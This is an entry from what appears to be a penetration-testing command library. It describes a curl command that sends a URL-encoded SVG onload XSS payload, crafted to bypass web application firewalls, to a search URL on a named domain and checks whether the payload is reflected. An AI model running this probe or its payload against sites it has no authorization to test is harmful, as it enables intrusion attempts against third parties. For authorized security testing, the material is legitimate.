---
id: cmd-002
data: >-
  curl -s
  "https://panther.com/search/test%3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E"
  | grep -i "svg"
tags:
  - xss
  - waf-bypass
type: command
output: >-
  Expected: Lines containing <svg on onload=(alert)(document.domain)> if
  reflected.
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:50.037Z'
verified: false
validated: true
submitted: true
---
# curl-svg-xss-test

## Command

```bash
curl -s "https://panther.com/search/test%3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E" | grep -i "svg"
```

## Description

This command tests for WAF-bypassing XSS by sending an SVG payload via curl and checking for reflection. It's used to verify if advanced payloads evade filters before browser execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| URL | Target with encoded SVG payload | Yes |
| `grep -i "svg"` | Search for SVG tag | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://panther.com/search/test%3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E" | grep -i "svg"
```

### Advanced Usage

```bash
curl -s "https://target/search/<svg-payload>" | grep -E "(svg|onload|alert)"
```

## Expected Output

Vulnerable response shows the SVG tag in output, e.g., "<svg on onload=(alert)(document.domain)>". Empty output indicates blocking.

## Related

- [[Related Procedure: Bypass-WAF-for-JavaScript-Execution-in-XSS]]
